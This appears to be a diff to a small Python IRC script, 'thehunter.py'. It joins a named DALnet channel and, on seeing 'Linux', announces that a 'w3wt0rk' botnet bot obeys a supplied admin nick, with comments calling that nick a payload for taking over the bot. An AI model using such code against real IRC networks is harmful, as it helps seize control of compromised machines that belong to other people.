@@ -7,17 +7,17 @@ import socket
 import sys
 
 def usage():
-     print("USAGE: python thehunter.py nick")  
+     print("USAGE: python thehunter.py nick \n")  
      
-def main():
-   
-   if len(argv) < 2:
+def main(argv):
+    
+    if len(argv) < 2:
         return usage()
 
     #irc server connection settings
+    botnick = sys.argv[1] #admin payload for taking over the w3wt0rk bot
     server = "us.dal.net" #irc server
     channel = "#buhaypirata" #channel where the bot is located
-    botnick = "placeyouradminhere" #admin payload for taking over the w3wt0rk bot
 
     irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
     print "connecting to:"+server
@@ -31,15 +31,15 @@ def main():
         text=irc.recv(2040)  #receive the text
         print text   #print text to console
 
-       if text.find('PING') != -1:                          #check if 'PING' is found
-          irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
-       if text.find('!quit') != -1: #quit the Bot
-          irc.send ("QUIT\r\n") 
-          sys.exit()
-       if text.find('Linux') != -1:                         
-          irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
-          irc.send ("QUIT\r\n")
-          sys.exit()
+        if text.find('PING') != -1:                          #check if 'PING' is found
+            irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
+        if text.find('!quit') != -1: #quit the Bot
+            irc.send ("QUIT\r\n") 
+            sys.exit()
+        if text.find('Linux') != -1:                         
+            irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
+            irc.send ("QUIT\r\n")
+            sys.exit()
 
 if __name__ == "__main__":
     main(sys.argv)
